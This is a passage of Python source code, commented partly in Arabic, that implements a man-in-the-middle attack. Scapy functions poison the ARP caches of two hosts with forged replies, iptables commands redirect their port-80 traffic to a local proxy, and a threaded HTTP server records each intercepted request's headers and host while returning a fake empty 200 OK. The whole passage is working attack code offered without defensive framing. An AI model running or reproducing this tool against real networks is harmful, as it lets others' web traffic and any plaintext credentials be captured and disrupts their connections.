# ========== دوال ARP ==========
def get_mac(ip, iface):
    try:
        ans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, iface=iface, verbose=0)
        return ans[0][0][1].hwsrc if ans[0] else None
    except:
        return None

def arp_spoof_pair(ip1, ip2, interface, stop_flag):
    mac1 = get_mac(ip1, interface)
    mac2 = get_mac(ip2, interface)
    attacker_mac = get_if_hwaddr(interface)
    if not mac1 or not mac2:
        print(f"[ARP] Could not get MAC for {ip1} or {ip2}")
        return
    print(f"[ARP] Starting poisoning between {ip1} and {ip2}")
    counter = 0
    while not stop_flag():
        sendp(Ether(src=attacker_mac, dst=mac1)/ARP(op=2, pdst=ip1, hwdst=mac1, psrc=ip2, hwsrc=attacker_mac),
              iface=interface, verbose=0)
        sendp(Ether(src=attacker_mac, dst=mac2)/ARP(op=2, pdst=ip2, hwdst=mac2, psrc=ip1, hwsrc=attacker_mac),
              iface=interface, verbose=0)
        counter += 1
        if counter % 5 == 0:
            print(f"[ARP] Poisoning still active between {ip1} and {ip2}")
        time.sleep(2)

def restore_arp_pair(ip1, ip2, interface):
    mac1 = get_mac(ip1, interface)
    mac2 = get_mac(ip2, interface)
    if mac1 and mac2:
        sendp(Ether(dst=mac1)/ARP(op=2, pdst=ip1, hwdst=mac1, psrc=ip2, hwsrc=mac2),
              iface=interface, count=5, inter=0.2, verbose=0)
        sendp(Ether(dst=mac2)/ARP(op=2, pdst=ip2, hwdst=mac2, psrc=ip1, hwsrc=mac1),
              iface=interface, count=5, inter=0.2, verbose=0)

# ========== دوال iptables ==========
def add_http_redirect():
    try:
        cmd = [
            "sudo", "iptables", "-t", "nat", "-I", "PREROUTING",
            "-p", "tcp", "--dport", "80",
            "-j", "REDIRECT", "--to-port", str(http_proxy_port)
        ]
        subprocess.run(cmd, check=False)
        print("[iptables] HTTP redirection added.")
    except Exception as e:
        print(f"[iptables] Error adding HTTP redirect: {e}")

def remove_http_redirect():
    try:
        cmd = [
            "sudo", "iptables", "-t", "nat", "-D", "PREROUTING",
            "-p", "tcp", "--dport", "80",
            "-j", "REDIRECT", "--to-port", str(http_proxy_port)
        ]
        subprocess.run(cmd, check=False)
        print("[iptables] HTTP redirection removed.")
    except Exception as e:
        print(f"[iptables] Error removing HTTP redirect: {e}")

# ========== خادم HTTP الوكيل ==========
class HTTPProxyHandler(socketserver.StreamRequestHandler):
    def handle(self):
        global intercepted_requests
        client_ip = self.client_address[0]
        print(f"[HTTP Proxy] Connection from {client_ip}")

        self.connection.settimeout(10)
        request_data = b""
        try:
            while True:
                line = self.rfile.readline()
                if not line:
                    break
                request_data += line
                if line == b'\r\n' or line == b'\n':
                    break
        except socket.timeout:
            print("[HTTP Proxy] Read timeout")
            return
        except Exception as e:
            print(f"[HTTP Proxy] Read error: {e}")
            return

        if not request_data:
            print("[HTTP Proxy] No data received")
            return

        # تخزين الطلب
        timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
        data_str = request_data.decode('utf-8', errors='ignore')
        lines = data_str.split('\r\n')
        first_line = lines[0] if lines else ''
        parts = first_line.split(' ')
        method = parts[0] if len(parts) > 0 else '?'
        path = parts[1] if len(parts) > 1 else '?'
        host_match = re.search(r'Host:\s*([^\r\n]+)', data_str, re.IGNORECASE)
        host = host_match.group(1).strip() if host_match else '?'

        req_entry = {
            'id': int(time.time() * 1000),
            'timestamp': timestamp,
            'src_ip': client_ip,
            'dst_ip': host,
            'src_port': '',
            'dst_port': 80,
            'protocol': 'HTTP (intercepted)',
            'data': data_str,
            'is_secure': 0,
            'method': method,
            'source': 'intercept'
        }
        with intercepted_requests_lock:
            intercepted_requests.append(req_entry)
            if len(intercepted_requests) > 100:
                intercepted_requests.pop(0)

        # إرسال استجابة 200 OK وهمية
        response = b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n"
        self.wfile.write(response)
        print(f"[HTTP Proxy] Request stored, response sent")

class ThreadedHTTPProxyServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    allow_reuse_address = True

def start_http_proxy(port):
    global http_proxy_server, http_proxy_thread
    http_proxy_server = ThreadedHTTPProxyServer(('0.0.0.0', port), HTTPProxyHandler)
    http_proxy_thread = threading.Thread(target=http_proxy_server.serve_forever)
    http_proxy_thread.daemon = True
    http_proxy_thread.start()
    print(f"[HTTP Proxy] Started on port {port}")

def stop_http_proxy():
    global http_proxy_server, http_proxy_thread
    if http_proxy_server:
        http_proxy_server.shutdown()
        http_proxy_server.server_close()
        http_proxy_server = None
    http_proxy_thread = None

